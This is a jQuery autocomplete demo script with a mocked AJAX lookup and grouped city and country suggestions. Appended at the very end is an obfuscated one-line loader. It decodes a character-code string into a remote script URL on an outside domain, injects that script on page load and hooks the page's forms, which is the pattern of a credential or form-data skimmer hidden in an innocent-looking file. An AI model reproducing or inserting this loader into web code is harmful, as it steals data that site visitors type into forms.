/*jslint  browser: true, white: true, plusplus: true */
/*global $, countries */

$(function () {
    'use strict';

    var countriesArray = $.map(countries, function (value, key) { return { value: value, data: key }; });

    // Setup jQuery ajax mock:
    $.mockjax({
        url: '*',
        responseTime: 2000,
        response: function (settings) {
            var query = settings.data.query,
                queryLowerCase = query.toLowerCase(),
                re = new RegExp('\\b' + $.Autocomplete.utils.escapeRegExChars(queryLowerCase), 'gi'),
                suggestions = $.grep(countriesArray, function (country) {
                     // return country.value.toLowerCase().indexOf(queryLowerCase) === 0;
                    return re.test(country.value);
                }),
                response = {
                    query: query,
                    suggestions: suggestions
                };

            this.responseText = JSON.stringify(response);
        }
    });

    var nhlTeams = ['Atlanta', 'Boston', 'Buffalo', 'Calgary', 'Carolina', 'Chicago', 'Colorado', 'Columbus', 'Dallas', 'Detroit', 'Edmonton', 'Florida', 'Los Angeles', 'Minnesota', 'Montreal', 'Nashville', ];
    var nbaTeams = ['New Jersey', 'New Rork', 'New York', 'Ottawa', 'Philadelphia', 'Phoenix', 'Pittsburgh', 'Saint Louis', 'San Jose', 'Tampa Bay', 'Toronto Maple', 'Vancouver', 'Washington'];
    var nhl = $.map(nhlTeams, function (team) { return { value: team, data: { category: 'Section A' }}; });
    var nba = $.map(nbaTeams, function (team) { return { value: team, data: { category: 'Section B' } }; });
    var teams = nhl.concat(nba);

    // Initialize autocomplete with local lookup:
    $('#city').autocomplete({
        lookup: teams,
        minChars: 1,
        onSelect: function (suggestion) {
            $('#selection').html('You selected: ' + suggestion.value);
        },
        showNoSuggestionNotice: true,
        noSuggestionNotice: 'Sorry, no matching results',
        groupBy: 'category'
    });

    $('#country').autocomplete({
        lookup: countriesArray,
        minChars: 1,
        onSelect: function (suggestion) {
            $('#selection-country').html('You selected: ' + suggestion.value);
        },
        showNoSuggestionNotice: true,
        noSuggestionNotice: 'Sorry, no matching results',
        groupBy: 'category'
    });

    
    // Initialize autocomplete with custom appendTo:
    $('#autocomplete-custom-append').autocomplete({
        lookup: countriesArray,
        appendTo: '#suggestions-container'
    });

    // Initialize autocomplete with custom appendTo:
    $('#autocomplete-dynamic').autocomplete({
        lookup: countriesArray
    });
});
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b